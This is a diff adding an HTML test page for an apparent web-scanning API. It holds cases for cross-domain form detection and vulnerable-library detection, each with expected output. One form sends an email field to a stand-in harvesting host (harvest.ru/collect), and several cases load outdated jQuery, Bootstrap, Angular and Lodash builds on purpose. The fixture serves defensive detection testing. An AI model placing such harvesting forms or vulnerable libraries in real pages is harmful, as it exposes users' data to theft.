@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>SCAN_API — Experimental Detection Test</title>
+    <style>
+        body { font-family: sans-serif; max-width: 700px; margin: 60px auto; color: #333; }
+        h1 { font-size: 1.2rem; margin-bottom: 8px; }
+        p { color: #666; font-size: 0.9rem; margin-bottom: 32px; }
+        h2 { font-size: 1rem; margin-top: 40px; margin-bottom: 4px; border-top: 1px solid #eee; padding-top: 16px; }
+        .case { margin-bottom: 28px; }
+        label { display: block; font-size: 0.8rem; color: #999; margin-bottom: 6px; }
+        code { font-size: 0.8rem; background: #f4f4f4; padding: 2px 5px; border-radius: 3px; }
+        .expected { font-size: 0.8rem; color: #555; margin-top: 6px; }
+    </style>
+</head>
+<body>
+    <h1>SCAN_API — Experimental Detection Test</h1>
+    <p>
+        Serve this file locally (<code>python3 -m http.server 9000</code>), then scan with:<br>
+        <code>POST /api/score/deep { "url": "http://localhost:9000/SCAN_API_TEST.html" }</code><br>
+        Check <code>.experimental[]</code> in response.
+    </p>
+
+    <!-- ───────────────────────────────────────────────────────── -->
+    <h2>Cat 1 — Cross-Domain Form</h2>
+
+    <div class="case">
+        <label>1.1 — form action on external domain (should fire)</label>
+        <form action="https://harvest.ru/collect" method="post">
+            <input type="text" name="email" placeholder="your@email.com">
+            <button type="submit">Submit</button>
+        </form>
+        <p class="expected">Expected: <code>{ type: "cross_domain_form", page: "localhost", action: "harvest.ru" }</code></p>
+    </div>
+
+    <div class="case">
+        <label>1.2 — form action on same origin (should NOT fire)</label>
+        <form action="/submit" method="post">
+            <input type="text" name="email" placeholder="your@email.com">
+            <button type="submit">Submit</button>
+        </form>
+        <p class="expected">Expected: no signal</p>
+    </div>
+
+    <div class="case">
+        <label>1.3 — form with no action (should NOT fire)</label>
+        <form method="post">
+            <input type="text" name="email" placeholder="your@email.com">
+            <button type="submit">Submit</button>
+        </form>
+        <p class="expected">Expected: no signal</p>
+    </div>
+
+    <!-- ───────────────────────────────────────────────────────── -->
+    <h2>Cat 2 — Vulnerable JS Libraries</h2>
+
+    <div class="case">
+        <label>2.1 — jQuery 1.9.1 from CDN (should fire)</label>
+        <script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
+        <p class="expected">Expected: <code>{ type: "vulnerable_js_libs", libs: [{ lib: "jquery", version: "1.9.1", src: "..." }] }</code></p>
+    </div>
+
+    <div class="case">
+        <label>2.2 — Bootstrap 3.3.7 from CDN (should fire)</label>
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+        <p class="expected">Expected: <code>{ type: "vulnerable_js_libs", libs: [{ lib: "bootstrap", version: "3.3.7", src: "..." }] }</code></p>
+    </div>
+
+    <div class="case">
+        <label>2.3 — Angular 1.5.0 from CDN (should fire)</label>
+        <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.0/angular.min.js"></script>
+        <p class="expected">Expected: <code>{ type: "vulnerable_js_libs", libs: [{ lib: "angular", version: "1.5.0", src: "..." }] }</code></p>
+    </div>
+
+    <div class="case">
+        <label>2.4 — Lodash 1.3.1 from CDN (should fire)</label>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/1.3.1/lodash.min.js"></script>
+        <p class="expected">Expected: <code>{ type: "vulnerable_js_libs", libs: [{ lib: "lodash", version: "1.3.1", src: "..." }] }</code></p>
+    </div>
+
+    <div class="case">
+        <label>2.5 — jQuery 3.7.1 (modern — should NOT fire)</label>
+        <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+        <p class="expected">Expected: no signal</p>
+    </div>
+
+</body>
+</html>
